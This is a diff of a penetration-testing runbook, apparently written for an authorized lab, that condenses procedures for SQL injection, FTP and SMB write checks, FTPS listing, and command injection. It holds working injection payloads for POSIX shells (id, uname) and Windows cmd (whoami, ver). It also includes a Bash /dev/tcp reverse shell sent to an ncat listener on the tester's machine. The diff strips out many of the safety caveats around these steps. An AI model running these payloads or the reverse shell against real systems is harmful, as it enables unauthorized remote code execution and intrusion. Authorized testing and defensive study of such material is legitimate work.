-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Baseline/true/control retain the same ordinary result; false removes that result under stable session/format | Record a Boolean SQL-interpretation lead and exact field/context. Inspect local source/error evidence for engine/query shape at **EXP-01**; further extraction needs its explicit procedure, not automatic dumping. |
-| Error differs only for added SQL text | Syntax/validation anomaly only. **WEB-06/WEB-08** to verify context, **PAUSE-COVERAGE** for the missing query/engine fact. |
-| All results same, or both modified values fail input validation | This comparison did not verify SQL interpretation. Choose another evidenced field at **WEB-01**; do not mark the entire app safe. |
-| Changing timestamps/tokens, empty baseline, cache or wrong record context | Repeat neither payload automatically. Restore a meaningful stable baseline at **WEB-06**. |
-| Auth, transport, rate-limit or incomplete-body failure | **WEB-09** or **PAUSE-COVERAGE** before interpreting Boolean differences. |
-
-Compare the result-bearing area, not only byte counts/status. Hashes aid custody:
-
-```bash
-sha256sum -- './wsql-<same-run-id>/baseline.body' './wsql-<same-run-id>/true.body' './wsql-<same-run-id>/false.body' './wsql-<same-run-id>/control.body'
-```
-
-Keep proof private at private adventure evidence, then remove these local responses:
-
-```bash
-rm -i -- './wsql-<same-run-id>/baseline.body' './wsql-<same-run-id>/true.body' './wsql-<same-run-id>/false.body' './wsql-<same-run-id>/control.body'
-rmdir -- './wsql-<same-run-id>'
-```
-No UNION extraction, credential collection, stacked writes, timing delays or
-out-of-band traffic was requested. A verified visible SELECT context can continue
-at **WSQL-03**; a separately calibrated Boolean-only channel at **WSQL-06**.
-
-When baseline/true/restored controls support the exact numeric read-only SQL
-condition, use **WSQL-03** only if visible SELECT results justify UNION shape/type
-review. If width, text slot and engine context are already verified, **WSQL-04**
-asks one engine/context/catalog/row question. **WSQL-05** discovers names only
-after visible output, engine and namespace prerequisites are verified.
-A calibrated Boolean-only channel uses **WSQL-06** for one authorized, known
-scalar with a chosen manual request budget. Missing engine/row context stays at
-**PAUSE-COVERAGE**. Neither result authorizes a dump or guessed file/OS operation.
-
-An observed single-quoted lookup uses **WSQL-02** with its own literal-closing
-prerequisite; it is not a numeric recipe with an arbitrary quote appended.
-
-Cleanup: these continuation decisions use read-only comparisons and do not change
-server state. Close the SQL client, retain only the exact request/result
-needed for the next decision, and use **PAUSE-RECOVERY** if a client disconnect
-leaves transaction or session state uncertain.
+| Only false changes the result | **WSQL-03** for visible output, or **WSQL-06** for Boolean-only. |
+| Error only | **WEB-06** / **PAUSE-COVERAGE**. |
+| Nothing differs | Another field at **WEB-01**. |
+| Session or rate limit | **WEB-09** / **PAUSE-COVERAGE**. |
 
 ## WSTORE-01. Does one observed stored-input flow persist an inert marker?
 
-Enter only when WEB-08 shows an observed create/update request, a separate
-same-origin retrieval view, and an exact permitted delete or reset route. If the
-cleanup route is unknown, stop at **GAP-WEB-INPUT**; do not create state merely to
-test whether it persists. Use an inert alphanumeric marker, not markup, script or
-an expression.
+Enter only with a create request, a retrieval view and a known delete route.
 
 ```bash
-mkdir -m 700 -- './wstore-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --request POST --data-urlencode '<field>=OWB_STORE_<NONCE>' -o create.body -w 'HTTP %{http_code}\n' '<CREATE_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 -o view.body '<VIEW_URL>'
+grep -F 'OWB_STORE_<NONCE>' view.body
 ```
 
-For the observed ordinary URL-form POST, repeat the exact required fields and
-current CSRF/session context in create and cleanup requests. Other methods or
-media types require their captured request, not this template. Inspect each
-response before proceeding. Use a fresh 8-32-character alphanumeric `<nonce>`:
+Then use the observed delete/reset route and re-read the view; the marker must be gone.
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --request POST --data-urlencode '<stored-field>=OWB_STORE_<nonce>' \
-  --output './wstore-<same-run-id>/create.body' \
-  --write-out 'Create HTTP %{http_code}\n' '<exact-observed-create-or-update-url>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --output './wstore-<same-run-id>/view.body' \
-  --write-out 'View HTTP %{http_code}\n' '<exact-observed-retrieval-url>'
-```
-
-```bash
-grep -F -- 'OWB_STORE_<same-nonce>' './wstore-<same-run-id>/view.body' | head -n 5 | cat -v
-```
-
-Inspect the create/view response and then use only the observed cleanup request:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --request POST --data-urlencode '<exact-observed-record-selector>=<created-record-id>' \
-  --output './wstore-<same-run-id>/delete.body' \
-  --write-out 'Delete/reset HTTP %{http_code}\n' '<exact-observed-delete-or-reset-url>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --output './wstore-<same-run-id>/after.body' \
-  --write-out 'After cleanup HTTP %{http_code}\n' '<same-observed-retrieval-url>'
-```
-
-Only after a complete, attributable retrieval, inspect the normal record view
-and check the marker. A missing match in a failed request, login page or generic
-error is **not** confirmed deletion:
-
-```bash
-grep -F -- 'OWB_STORE_<same-nonce>' './wstore-<same-run-id>/after.body' | head -n 5 | cat -v
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Marker appears only after create and disappears after the observed cleanup | Record request shape, retrieval view, marker and cleanup result privately; private adventure evidence. Persistence is proven for this flow, not script execution or cross-user impact. |
-| Marker never appears in the retrieval view | Record create/view status and body extent; **WEB-08** or **PAUSE-COVERAGE** for the missing storage/display fact. Do not call the input unsaved globally. |
-| Marker appears but cleanup fails or remains visible | **PAUSE-RECOVERY**; preserve the exact record/path and do not create more entries. |
-| Response escapes or transforms the marker | Record the transformation only; this is not script execution. Return to **WEB-08** for the observed renderer/context. |
-| Redirect, login, rate limit, wrong origin or unstable response | **WEB-09** or **PAUSE-COVERAGE**; do not forward headers or repeat automatically. |
-
-This decision does not test XSS, template evaluation, blind effects, other users'
-records or alternate carriers. It requires cleanup before leaving the flow.
-After custody and confirmed remote cleanup, remove only the local responses:
-
-```bash
-rm -i -- './wstore-<same-run-id>/create.body' './wstore-<same-run-id>/view.body' './wstore-<same-run-id>/delete.body' './wstore-<same-run-id>/after.body'
-rmdir -- './wstore-<same-run-id>'
-```
+| Appears after create, gone after cleanup | **NET-05**; persistence proven, not execution. |
+| Never appears | **WEB-08** / **PAUSE-COVERAGE**. |
+| Cleanup fails or marker remains | **PAUSE-RECOVERY**. |
+| Session or rate limit | **WEB-09** / **PAUSE-COVERAGE**. |
 
 # ftp_write
 
 ## FTP-03. Does one observed FTP write path accept and remove an inert file?
 
-Use only the exact writable directory and permitted delete operation established
-by FTP-01/02 and the assigned exercise. Pick one fresh, simple ASCII filename
-stem, such as `OWB_CHECK_20260928_01`. Replace the same stem, host, observed
-port, directory and supplied username in every command. Use an empty path only
-when the observed writable location is the FTP login directory. `curl` prompts
-for the supplied password; never put it in a command. For an anonymous context,
-replace the username with `anonymous:`. Stop if the proposed filename already
-exists, the path needs URL encoding, or the delete route is uncertain.
-
-Check that the chosen filename is absent from the observed directory:
-
 ```bash
-curl --disable --globoff --list-only -sS --fail --connect-timeout 5 --user '<supplied-username>' 'ftp://<authorized-host>:<observed-ftp-port>/<observed-relative-directory>/'
+printf 'probe\n' | curl --disable --globoff -sS --fail --user '<USER>' --upload-file - 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
+curl --disable --globoff -sS --fail --user '<USER>' -o probe.copy 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
+curl --disable --globoff --list-only -sS --fail --user '<USER>' --quote '+DELE probe-<ID>.txt' 'ftp://<TARGET_IP>:<PORT>/<DIR>/'
+rm probe.copy
 ```
 
-Upload the inert marker once. This reads the marker from standard input, so it
-does not create a local source file:
-
-```bash
-printf 'operator-workbench inert FTP write marker\n' | curl --disable --globoff -sS --fail --connect-timeout 5 --user '<supplied-username>' --upload-file - 'ftp://<authorized-host>:<observed-ftp-port>/<observed-relative-directory>/<same-unique-name>.txt'
-```
-
-Retrieve the same file into one new local copy, then compare its hash with the
-marker. Run the hash command only if retrieval completed. The two hashes must
-match exactly:
-
-```bash
-curl --disable --globoff -sS --fail --connect-timeout 5 --max-filesize 1048576 --user '<supplied-username>' --output './<same-unique-name>.copy' 'ftp://<authorized-host>:<observed-ftp-port>/<observed-relative-directory>/<same-unique-name>.txt'
-```
-
-```bash
-printf 'operator-workbench inert FTP write marker\n' | sha256sum
-sha256sum -- './<same-unique-name>.copy'
-```
-
-Delete only the uploaded name in the same directory. Run this cleanup even if
-the retrieval or hash check failed, provided the upload succeeded and the
-server, identity and directory are still the same:
-
-```bash
-curl --disable --globoff --list-only -sS --fail --connect-timeout 5 --user '<supplied-username>' --quote '+DELE <same-unique-name>.txt' 'ftp://<authorized-host>:<observed-ftp-port>/<observed-relative-directory>/'
-```
-
-Confirm that the exact file can no longer be retrieved. A not-found response is
-expected; an authentication or transport error does not confirm deletion:
-
-```bash
-curl --disable --globoff -sS --fail --connect-timeout 5 --user '<supplied-username>' --output /dev/null 'ftp://<authorized-host>:<observed-ftp-port>/<observed-relative-directory>/<same-unique-name>.txt'
-```
-
-Remove only the local copy created by this task, after recording its hash:
-
-```bash
-rm -- './<same-unique-name>.copy'
-```
-
-| Result                                                                          | Next choice                                                                                                                                                                                                 |
-| ------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Upload/read succeed, hashes match, delete succeeds and the exact file is absent | Record one write/read/remove boundary with identity, directory, name and hashes in private evidence, then **NET-05**. This does not prove execution. |
-| Login, listing, upload or directory permission is denied                        | Preserve the exact stage and identity;**FTP-01** or **NET-05**. Do not retry with guessed credentials or another directory. If upload may have succeeded, attempt exact cleanup before leaving. |
-| Upload succeeds but read/hash comparison fails                                  | Treat the file as partial or ambiguous. Attempt exact cleanup; if it fails,**PAUSE-RECOVERY** before another write.                                                                                   |
-| Delete is denied/unavailable, or the file remains readable                      | **PAUSE-RECOVERY**; preserve the unique path and stop creating files.                                                                                                                                 |
-| Host, directory, identity or protocol changes                                   | Stop attribution and return to**FTP-01**; do not clean a different server/path.                                                                                                                       |
-
-Do not upload scripts, archives, credentials or payloads. Record whether the
-remote file was removed and whether the local copy was removed.
+| Result | Next |
+| --- | --- |
+| Upload, read and delete succeed | **NET-05**; not execution. |
+| Write denied | **FTP-01** / **NET-05**. |
+| Upload ok, read fails | Attempt cleanup, otherwise **PAUSE-RECOVERY**. |
+| Delete denied or file remains | **PAUSE-RECOVERY**. |
 
 # ftp_tls
 
 ## FTP-04. Does the observed FTP TLS endpoint give a verified listing?
 
-Use the exact observed mode, assigned certificate hostname and CA file. Replace
-the same host, IP, port, username and observed path in the matching command.
-`curl` prompts for the supplied password; do not include it in the command.
-Use `anonymous:` for an authorized anonymous context. Do not use `-k`, change
-the certificate name, downgrade to plaintext or try another account.
-These commands print the selected directory listing and final verification
-status. A TLS handshake or login alone is not a completed listing.
-
-For implicit FTPS, use the observed FTPS port and verify the hostname:
+Implicit FTPS:
 
 ```bash
-curl --disable --globoff --path-as-is -sS --fail \
-  --connect-timeout 5 --ftp-pasv \
-  --cacert '<absolute-path-to-assigned-CA.pem>' \
-  --resolve '<assigned-cert-hostname>:<observed-ftp-port>:<authorized-ip>' \
-  --user '<supplied-username>' \
-  --write-out 'FTP reply %{response_code}; TLS verify %{ssl_verify_result}\n' \
-  'ftps://<assigned-cert-hostname>:<observed-ftp-port>/<observed-relative-path>/'
+curl --disable --globoff --path-as-is -sS --fail --ftp-pasv --cacert '<CA>' --resolve '<CERT_HOST>:<PORT>:<TARGET_IP>' --user '<USER>' -w 'TLS %{ssl_verify_result}\n' 'ftps://<CERT_HOST>:<PORT>/<DIR>/'
 ```
 
-For explicit FTP STARTTLS, use only when that mode was observed:
+For STARTTLS use `--ssl-reqd` and `ftp://`.
 
-```bash
-curl --disable --globoff --path-as-is -sS --fail \
-  --connect-timeout 5 --ftp-pasv --ssl-reqd \
-  --cacert '<absolute-path-to-assigned-CA.pem>' \
-  --resolve '<assigned-cert-hostname>:<observed-ftp-port>:<authorized-ip>' \
-  --user '<supplied-username>' \
-  --write-out 'FTP reply %{response_code}; TLS verify %{ssl_verify_result}\n' \
-  'ftp://<assigned-cert-hostname>:<observed-ftp-port>/<observed-relative-path>/'
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| TLS and hostname verify, login succeeds, and the selected directory listing completes | Record mode, endpoint, identity and listed path; **FTP-02** for one selected named file under this same TLS context, or **NET-05** if nothing relevant is listed. |
-| Certificate missing, expired, hostname mismatch or CA unreadable | **PAUSE-ROUTE** or **PAUSE-COVERAGE**; do not use `-k`, replace the CA silently or downgrade. |
-| TLS negotiation fails before authentication | Preserve implicit versus STARTTLS stage and route to **NET-03**; do not call it an account denial. |
-| Login denied after a verified TLS channel | Preserve the exact identity; **NET-05** for another observed lead. Do not guess or retry across protocols. |
-| Login succeeds but listing is denied, partial or its data channel fails | Keep authentication separate from listing; **NET-05** or **PAUSE-COVERAGE** with the exact incomplete directory. No FTP-02 file-read claim. |
-| Endpoint redirects, changes host/port or only offers plaintext | Stop attribution and return to **NET-05**; plaintext is not an automatic fallback. |
-
-The path may be empty only when the observed directory is the login directory.
-No file upload or deletion is part of this decision. Close the FTP client when
-finished and keep only the relevant listing and certificate metadata. If the
-client is still open, close it before another connection.
+| Verified TLS and listing | **FTP-02** in this TLS context. |
+| Certificate failure | **PAUSE-ROUTE**; do not use `-k`. |
+| TLS fails before auth | **NET-03**. |
+| Login denied | **NET-05**. |
 
 # smb_write
 
 ## SMB-03. Does one observed SMB write path accept and remove an inert file?
 
-Use only the server, share, identity and writable directory established by
-SMB-01/02 when the exercise permits deleting the test file. Pick one fresh,
-simple ASCII filename stem, such as `OWB_CHECK_20260928_01`. Replace the same
-stem in every command. Stop if the name already exists locally or remotely, or
-the delete route is uncertain.
-
-Create one inert local file without overwriting an existing name:
+Enter when: SMB-02 read access works and write access is the question.
 
 ```bash
-( set -C; printf 'operator-workbench inert SMB write marker\n' > './<same-unique-name>.txt' )
+smbclient '//<TARGET_IP>/<SHARE>' -I '<TARGET_IP>' -p '<SMB_PORT>' -U '<DOMAIN_OR_SERVER>\<USERNAME>' --timeout 15
 ```
 
-Open the observed share with the supplied identity. `smbclient` prompts for the
-password; never place it on the command line:
-
-```bash
-smbclient '//<observed-server>/<listed-share>' -I '<authorized-server-ip>' -p '<observed-smb-port>' -U '<supplied-domain/user>'
-```
-
-At the `smb: \>` prompt, change only to the observed writable directory. Skip
-this line if the observed location is the share root:
+At the prompt, create, list, delete:
 
 ```text
-cd "<observed-relative-directory>"
-```
-
-Check that the remote name is absent. A denied listing does not prove absence:
-
-```text
-ls "<same-unique-name>.txt"
-```
-
-Upload the local file once. The two names are the local source and remote
-destination, respectively:
-
-```text
-put "./<same-unique-name>.txt" "<same-unique-name>.txt"
-```
-
-Retrieve the same remote file into a new local copy:
-
-```text
-get "<same-unique-name>.txt" "./<same-unique-name>.copy"
-```
-
-In another Kali shell, compare hashes only if retrieval completed. The two
-hashes must match exactly:
-
-```bash
-sha256sum -- './<same-unique-name>.txt' './<same-unique-name>.copy'
-```
-
-Back at the same `smb: \>` prompt, delete only the uploaded name. Attempt this
-even if the first retrieval or hash comparison failed, provided the upload
-succeeded and the server, share, identity and directory are still the same:
-
-```text
-del "<same-unique-name>.txt"
-```
-
-Check the exact file again. An explicit not-found result supports deletion; a
-denied read does not:
-
-```text
-get "<same-unique-name>.txt" "./<same-unique-name>.post-delete"
-```
-
-End the client session:
-
-```text
+ls
+put /etc/hostname "probe-<RUN_ID>.txt"
+ls "probe-<RUN_ID>.txt"
+del "probe-<RUN_ID>.txt"
 quit
 ```
 
-In Kali, remove only the local files created by this task after recording the
-hashes. Omit any copy that was never created:
-
-```bash
-rm -- './<same-unique-name>.txt' './<same-unique-name>.copy' './<same-unique-name>.post-delete'
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| `put` and first `get` succeed, hashes match, `del` succeeds and final `get` reports the exact file missing | Record one write/read/delete boundary with server/share/path/identity and hashes; private adventure evidence, then **NET-05**. This does not prove execution. |
-| Logon, share, listing, directory or `put` is denied | Preserve the exact identity/path boundary; **SMB-01**, **SMB-02** or **NET-05**. If upload may have succeeded, attempt exact cleanup before leaving. |
-| Upload succeeds but the first read or hash comparison is incomplete | Attempt exact cleanup. If it fails, preserve remote/local custody and **PAUSE-RECOVERY** before another write. |
-| `del` is denied, unavailable or the final `get` still succeeds | **PAUSE-RECOVERY**; preserve the unique remote path and stop creating files. |
-| Referral, server, share, identity or directory changes | Stop attribution and return to **SMB-01**; do not clean a different server/path. |
-
-Do not upload scripts, archives, credentials or payloads. Record whether the
-remote file and each local copy were removed.
+| Write, read-back and delete all succeed | Record the writable path; **NET-05** or the application that consumes it. |
+| Write denied | **NET-05**. Read access did not imply write. |
+| Write succeeds, delete fails | Keep the path and go to **PAUSE-RECOVERY**. |
+| Transport or identity error | **SMB-01**. |
 
 # command_continuation
 
-Run in **Kali Bash**. Start with the working captured request at WEB-06/08 and
-evidence for its command interpreter and argument quoting. Select its real GET
-or ordinary URL-form POST carrier. Do not apply this to a command with unknown
-destructive behavior, stored/asynchronous input, JSON or multipart. Preserve the
-ordinary authorized value, other required fields, fresh CSRF context and current
-identity. Require curl 8.4+. The commands below show GET. For the observed ordinary
-URL-form POST, replace `--get` with `--request POST` in every request. Repeat
-required non-secret fields with `--data-urlencode 'name=value'`. An existing
-WEB-09 session uses its private header file only after manually checking the
-same scheme, hostname and port. No redirect is followed.
-
-Replace each value directly. These shell templates require a simple ordinary
-value and field using letters/digits/dots/underscores/hyphens. Other characters
-use the captured-request editor, not guessed local escaping. Run requests one
-at a time and inspect curl exit/status/body. Stop on failed directory creation,
-curl errors, partial output, 429, expired session/CSRF, login/other-origin redirects
-or instability. Keep needed responses privately before reusing an output path.
+Enter only with known quoting and a safe original command. GET shown; for a form use `--request POST` and repeat required fields.
 
 ## WEXEC-02. Does the observed quoted POSIX argument permit extra execution?
 
-Enter only with a known single- or double-quoted POSIX shell argument, no unresolved
-wrapping syntax, and visible command output. The original command must be safe
-with the ordinary value. The tail must be safe to omit; this example comments
-out the known trailing quote/arguments. Unquoted input uses WEXEC-01 instead.
+Single-quoted argument:
 
 ```bash
-mkdir -m 700 -- './posix-check-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; printf OWB_%s <NONCE> #" -o probe.body '<URL>'
 ```
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './posix-check-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
-
-Only after the normal result remains intact, use a fresh 8-32-character
-alphanumeric nonce. Choose one matching probe. Single-quoted server argument:
+Double-quoted argument uses `'<field>=<VALUE>"; printf OWB_%s <NONCE> #'` instead. Then verify identity:
 
 ```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-value>'; printf OWB_%s <nonce> #" \
-  --output './posix-check-<same-run-id>/probe.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Double-quoted server argument uses this **instead**:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>"; printf OWB_%s <nonce> #' \
-  --output './posix-check-<same-run-id>/probe.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Inspect the actual result area with terminal controls escaped:
-
-```bash
-sed -n '1,60p' './posix-check-<same-run-id>/probe.body' | cat -v
-```
-
-The contiguous `OWB_<nonce>` must be absent from the request and ordinary response,
-then appear as command output. Raw reflected payload, escaped HTML, normalized
-input or unrelated cached output is not enough. Only with that support, make one
-read-only native identity/OS check through the same quote context. Single-quoted:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-value>'; id; uname -s #" \
-  --output './posix-check-<same-run-id>/verify.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Double-quoted context uses this **instead**:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>"; id; uname -s #' \
-  --output './posix-check-<same-run-id>/verify.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-sed -n '1,60p' './posix-check-<same-run-id>/verify.body' | cat -v
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; id; uname -s #" -o verify.body '<URL>'
+sed -n '1,60p' verify.body | cat -v
 ```
 
 | Result | Next |
 | --- | --- |
-| Assembled marker plus real uid/gid and Linux OS output | Private adventure evidence records exact carrier, quote context and application identity. If the observed Bash path, safe tail and callback route match, select **WEXEC-05**; otherwise **EXP-01** for a different reviewed method. No interactive session exists yet. |
-| Marker reflected/normalized, identity absent or unrelated | Execution remains unverified. **WEB-06/WEB-08** recheck observed request/quoting; **PAUSE-COVERAGE** names the missing attribution fact. |
-| Syntax/input rejection or identical results | This selected carrier did not verify execution. Do not cycle quotes/separators automatically; choose a different evidence-backed context at **NET-05**. |
-| Output unavailable but safe command context still supported | Record an output-blind gap; a separately bounded timing/local-callback procedure is required, not a success assertion. |
-| Transport/session/limit changes or ordinary function breaks | **WEB-09/PAUSE-COVERAGE**; retain the incomplete comparison, stop contact until its cause is understood. |
-
-After private custody, remove only the local responses:
-
-```bash
-rm -i -- './posix-check-<same-run-id>/baseline.body' './posix-check-<same-run-id>/probe.body' './posix-check-<same-run-id>/verify.body'
-rmdir -- './posix-check-<same-run-id>'
-```
-
-These proof commands create no target
-files, listeners, background jobs or persistent settings. Record any application
-side effect separately and restore it through its normal confirmed UI; absence
-of an injected file is not proof that the original function made no changes.
+| Marker plus real uid/gid | **WEXEC-05** if Bash and a route exist, otherwise **EXP-01**. |
+| Reflected only | **WEB-06** / **PAUSE-COVERAGE**. |
+| Rejected | **NET-05** with another context. |
 
 ## WEXEC-03. Does the evidenced Windows cmd argument execute another command?
 
-Enter only with Windows **cmd.exe** command construction and returned command
-output. PowerShell, direct argv, single quotes or an unknown `cmd /c` wrapping
-layer are different contexts. Select an observed unquoted or double-quoted
-argument. The ordinary command must be safe, and its known trailing quote/args
-must be safe to omit with `rem`; unresolved nested commands stop this procedure.
+Unquoted:
 
 ```bash
-mkdir -m 700 -- './cmd-check-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE> & set /a 73190+7 & rem ' -o probe.body '<URL>'
 ```
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './cmd-check-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
-
-With an intact baseline, send one arithmetic proof. The computed decimal result
-`73197` is deliberately absent from the request. Unquoted server argument:
+Double-quoted uses `'<field>=<VALUE>" & set /a 73190+7 & rem '`. Then:
 
 ```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value> & set /a 73190+7 & rem ' \
-  --output './cmd-check-<same-run-id>/probe.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Double-quoted server argument uses this **instead**:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>" & set /a 73190+7 & rem ' \
-  --output './cmd-check-<same-run-id>/probe.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-sed -n '1,60p' './cmd-check-<same-run-id>/probe.body' | cat -v
-```
-
-Only a distinct calculated result in command output, absent from baseline, can
-continue. An application could itself calculate a value; verify with native
-identity and version through the same carrier. Unquoted server argument:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value> & whoami & ver & rem ' \
-  --output './cmd-check-<same-run-id>/verify.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Double-quoted context uses this **instead**:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>" & whoami & ver & rem ' \
-  --output './cmd-check-<same-run-id>/verify.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-sed -n '1,60p' './cmd-check-<same-run-id>/verify.body' | cat -v
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE> & whoami & ver & rem ' -o verify.body '<URL>'
+sed -n '1,60p' verify.body | cat -v
 ```
 
 | Result | Next |
 | --- | --- |
-| Arithmetic result and coherent Windows identity/version appear only in command output | Private adventure evidence with exact context. **EXP-01** selects a separately reviewed Windows foothold. **WIN-01** only after an actual Windows shell exists and is attributed. |
-| Raw expression reflected, calculated value unrelated, or no native identity | Not verified. **WEB-06/WEB-08** for exact parser/carrier, **PAUSE-COVERAGE** for the one missing fact. |
-| Caret escaping, quote parsing, validation or command-output capture differs | Keep this context unsupported; do not reinterpret POSIX examples as cmd recipes. Select another evidenced lead at **NET-05**. |
-| Authentication, transport, partial output or ordinary-function failure | **WEB-09/PAUSE-COVERAGE**; do not claim a negative result from an incomplete request. |
-| Windows result but host/process/token attribution unknown | Preserve application-process execution only. Privilege, interactive shell and assigned-host access are separate unresolved facts. |
-
-After recording any needed private evidence, remove the exact local responses:
-
-```bash
-rm -i -- './cmd-check-<same-run-id>/baseline.body' './cmd-check-<same-run-id>/probe.body' './cmd-check-<same-run-id>/verify.body'
-rmdir -- './cmd-check-<same-run-id>'
-```
-
-Inspect missing/retained files if cleanup fails; never use recursive deletion.
-`set /a` here performs arithmetic
-without assigning an environment variable. `whoami` and `ver` read context; no
-file, payload, persistence or callback is installed. Account for any normal
-application side effects independently. No password or target output belongs in
-this reusable checklist.
+| `73197`, then Windows identity and version | **EXP-01**; **WIN-01** only with a real shell. |
+| Reflected only | **WEB-08** / **PAUSE-COVERAGE**. |
+| Quoting differs | **NET-05** with another lead. |
 
 # command_shell
 
+Enter after WEXEC-01/02 proved execution and you know the Bash path and quote context.
+
 ## WEXEC-04. Can verified unquoted Linux command input provide a usable shell?
 
-Enter after **WEXEC-01** verified execution through an unquoted POSIX command
-argument. Require observed Linux/GNU Bash, its exact executable path, a working
-ordinary GET or URL-form request, and a permitted route back to Kali. The original
-command and omitted trailing arguments must be safe. Do not use this for quoted
-input, Windows, direct argv, stored/blind input or an unknown nested parser.
-Those need their own matched procedure, not automatic payload substitution.
-
-Use simple field/ordinary values and Bash paths without spaces or shell
-metacharacters. Replace the IPv4 address and port with your actual lab interface
-and one unused high TCP port. Do not use a guessed Windows host/NAT address.
-
-In **Kali terminal A**, check the local endpoint and start one foreground listener:
+Listener first:
 
 ```bash
-ip route get '<authorized-target-ipv4>'
-ncat --listen --verbose --nodns '<kali-lab-interface-ipv4>' '<unused-high-tcp-port>'
+ncat --listen --verbose --nodns '<KALI_IP>' '<PORT>'
 ```
 
-Keep that terminal for the incoming session. If binding fails, correct the exact
-local address/port before sending the request. No `--keep-open` or Kali-side
-command execution is enabled.
-
-In **Kali terminal B**, prepare a fresh private directory and confirm the ordinary
-request still works. Stop if directory creation, baseline or application context
-fails. Use curl 8.4+ and the same authorized endpoint/identity as WEXEC-01:
+Then trigger:
 
 ```bash
-mkdir -m 700 -- './command-shell-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; <BASH> -c "exec <BASH> -i >/dev/tcp/<KALI_IP>/<PORT> 2>&1 <&1"; #' -o delivery.body '<URL>'
 ```
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './command-shell-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
+In the shell: `hostname; id; uname -srm; pwd`.
 
-Send **one** request through the verified unquoted carrier:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>; <absolute-observed-bash> --noprofile --norc -c "exec <absolute-observed-bash> --noprofile --norc -i >/dev/tcp/<kali-lab-interface-ipv4>/<unused-high-tcp-port> 2>&1 <&1"; #' \
-  --output './command-shell-<same-run-id>/delivery.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-For the verified URL-form POST, do not adapt the request to GET. Use `--request
-POST` for baseline, delivery and control; repeat every required hidden, selector,
-action and submit field with its captured value, and use a fresh anti-CSRF value.
